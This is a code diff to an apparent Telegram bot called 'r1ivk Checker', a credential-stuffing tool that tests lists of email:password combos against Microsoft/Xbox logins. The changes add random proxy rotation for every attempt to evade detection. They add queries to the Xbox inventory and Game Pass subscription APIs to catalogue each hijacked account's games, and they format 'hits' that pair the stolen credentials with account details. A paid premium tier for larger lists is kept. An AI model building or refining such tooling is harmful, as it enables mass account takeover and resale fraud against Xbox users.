@@ -27,6 +27,20 @@ active_scans = {}
 scan_lock = threading.Lock()
 premium_users = []  # قائمة الـ IDs المشتركة بريميوم (30 يوم)
 
+# تحميل البروكسيات من الملف تلقائياً
+PROXIES_LIST = []
+if os.path.exists("good_proxies.txt"):
+    with open("good_proxies.txt", "r", encoding="utf-8") as f:
+        PROXIES_LIST = [line.strip() for line in f if line.strip()]
+
+def get_random_proxy():
+    if not PROXIES_LIST:
+        return None
+    p = random.choice(PROXIES_LIST)
+    if not p.startswith("http"):
+        return {"http": f"http://{p}", "https": f"http://{p}"}
+    return {"http": p, "https": p}
+
 # =================== BYPASS & CORE LOGIC ===================
 def extract_ppft(text):
     patterns = [
@@ -86,6 +100,12 @@ def check_account_turbo(combo, user_state):
         session.verify = False
         session.mount('https://', adapter)
         session.mount('http://', adapter)
+        
+        # تفعيل نظام البروكسي العشوائي لكل محاولة فحص
+        current_proxy = get_random_proxy()
+        if current_proxy:
+            session.proxies.update(current_proxy)
+
         session.headers.update({
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -191,6 +211,7 @@ def check_account_turbo(combo, user_state):
             xb_token = xb_req.json()['Token']
             uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
 
+            # جلب معلومات الملف الشخصي (Gamertag & Gamerscore)
             gamertag, gamerscore = "N/A", "0"
             try:
                 xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
@@ -207,49 +228,63 @@ def check_account_turbo(combo, user_state):
             except:
                 pass
 
-            has_gp, gp_type = False, "none"
+            # الفحص المطور والكامل: استعلام مكتبة ألعاب الإكس بوكس والاشتراكات الحقيقية (Entitlements & Inventory)
+            has_gp, gp_type = False, "None"
             is_minecraft = "NO"
             games_list = []
             
             try:
-                xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
-                xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, headers=xb_headers, timeout=10)
-                if xsts_mc_req.status_code == 200:
-                    xsts_mc_token = xsts_mc_req.json()['Token']
-                    mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
-                                           json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, 
-                                           headers={'Content-Type': 'application/json'}, timeout=10)
-                    if mc_auth.status_code == 200:
-                        mc_token = mc_auth.json().get('access_token')
-                        if mc_token:
-                            ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=10)
-                            if ent_req.status_code == 200:
-                                mc_ent_text = ent_req.text
-                                
-                                if 'product_game_pass_ultimate' in mc_ent_text or 'product_game_pass_pc' in mc_ent_text:
-                                    gp_type = "Ultimate/PC"
-                                    has_gp = True
-                                
-                                if 'product_minecraft' in mc_ent_text or 'game_minecraft' in mc_ent_text:
+                # توليد توكن مصرح به لخدمات المتجر ومكتبة الألعاب
+                xsts_store_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://licensing.xboxlive.com", "TokenType": "JWT"}
+                xsts_store_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_store_payload, headers=xb_headers, timeout=10)
+                
+                if xsts_store_req.status_code == 200:
+                    xsts_store_token = xsts_store_req.json()['Token']
+                    
+                    # استعلام مكتبة الألعاب الكاملة للمستخدم (Xbox Inventory Items)
+                    inv_req = session.get(
+                        "https://inventoryservices.xboxlive.com/users/me/inventory/items?type=Game",
+                        headers={"Authorization": f"XBL3.0 x={uhs};{xsts_store_token}", "x-xbl-contract-version": "1"},
+                        timeout=10
+                    )
+                    
+                    if inv_req.status_code == 200:
+                        items = inv_req.json().get("items", [])
+                        for item in items:
+                            name = item.get("name") or item.get("productId")
+                            if name and name not in games_list:
+                                games_list.append(str(name))
+                                if "minecraft" in str(name).lower():
                                     is_minecraft = "YES"
-                                    games_list.append("Minecraft")
-                                if 'product_dungeons' in mc_ent_text:
-                                    games_list.append("Minecraft Dungeons")
-                                if 'product_legends' in mc_ent_text:
-                                    games_list.append("Minecraft Legends")
+
+                # فحص اشتراكات الـ Game Pass من خلال Subscriptions API
+                sub_req = session.get(
+                    "https://purchase.mp.microsoft.com/v7/policies/subscriptions",
+                    headers={"Authorization": f"XBL3.0 x={uhs};{xb_token}"},
+                    timeout=10
+                )
+                if sub_req.status_code == 200:
+                    sub_text = sub_req.text.lower()
+                    if "game pass ultimate" in sub_text:
+                        gp_type = "Game Pass Ultimate"
+                        has_gp = True
+                    elif "game pass" in sub_text:
+                        gp_type = "Xbox Game Pass"
+                        has_gp = True
             except:
                 pass
 
+            # تنسيق مظهر الهت (Hit Block) ليطبع تفاصيل الحساب والألعاب كاملة
             hit_block = f"""{email}:{password}
-Account: Gamerscore: {gamerscore}G | GamePass: {gp_type} | Minecraft: {is_minecraft}
-Subscriptions:
+Account: Gamertag: {gamertag} | Gamerscore: {gamerscore}G | GamePass: {gp_type} | Minecraft: {is_minecraft}
+Subscriptions: {gp_type}
 Games List:"""
             
             if games_list:
                 for idx, g in enumerate(games_list, 1):
-                    hit_block += f"\n{idx} - {g} | Score: 0G"
+                    hit_block += f"\n{idx} - {g}"
             else:
-                hit_block += "\nNo extra games found."
+                hit_block += "\nNo extra games found in inventory."
             
             hit_block += f"\n{'-'*40}\n"
 
@@ -324,7 +359,6 @@ def handle_file(message):
 
         unique_combos = list(dict.fromkeys(combos))
 
-        # فحص حد الـ 10,000 سطر للنسخة العادية
         if not is_premium and len(unique_combos) > 10000:
             bot.send_message(chat_id, f"⚠️ *Limit Reached!*\nYour file has {len(unique_combos)} lines.\nFree version allows up to **10,000 lines** only.\n\nTo upgrade and remove limits, contact owner: {OWNER_USERNAME} (15$ / 30 Days)", parse_mode="Markdown")
             return
@@ -370,10 +404,10 @@ def update_stats_loop(chat_id, msg_id, state):
         text = f"""🔥 *LIVE SCAN STATS (Auto-refresh | {time.strftime('%H:%M:%S')})*
 
 📊 *Total:*         {state['total']}
-✓ *Checked:*   {state['checked']}
+✓ *Checked:*    {state['checked']}
 ✗ *Bad:*          {state['bad']}
-★ *Hits:*         {state['hits']}
-🔒 *2FA:*         {state['twofa']}
+★ *Hits:*          {state['hits']}
+🔒 *2FA:*          {state['twofa']}
 ⚠ *Errors:*      {state['errors']}
 
 Progress: {pct:.1f}%
@@ -408,12 +442,12 @@ def run_turbo_scan(combos, state, msg_id):
     state['is_running'] = False
     elapsed = time.time() - state['start_time']
     
-    final_text = f"""✅ *XBOX + MINECRAFT + GAMEPASS SCAN COMPLETED!*
+    final_text = f"""✅ *XBOX + FULL LIBRARY + GAMEPASS SCAN COMPLETED!*
 
 📊 *Total:*        {state['total']}
 ★ *Hits:*        {state['hits']}
 🔒 *2FA:*        {state['twofa']}
-✗ *Bad:*         {state['bad']}
+✗ *Bad:*          {state['bad']}
 
 ⏱️ *Time:* {time.strftime('%H:%M:%S', time.gmtime(elapsed))}"""
 
@@ -426,7 +460,7 @@ def run_turbo_scan(combos, state, msg_id):
         result_file_path = f"r1ivk_checker_hits_{int(time.time())}.txt"
         try:
             with open(result_file_path, 'w', encoding='utf-8') as f:
-                f.write("🔥 r1ivk Checker ⚡ Scan Results 🔥\n")
+                f.write("🔥 r1ivk Checker ⚡ Scan Results (Full Library & GamePass) 🔥\n")
                 f.write(f"📅 {time.strftime('%Y-%m-%d %H:%M:%S')} | 👑 Owner: {OWNER_USERNAME}\n")
                 f.write("="*50 + "\n\n")
                 f.writelines(state['hits_list'])
@@ -441,5 +475,5 @@ def run_turbo_scan(combos, state, msg_id):
         bot.send_message(state['chat_id'], "⚠️ Scan finished, no hits found.")
 
 if __name__ == "__main__":
-    print("[+] r1ivk Checker ⚡ is running...")
+    print("[+] r1ivk Checker ⚡ is running with Proxy Rotation & Full Library Check...")
     bot.infinity_polling()
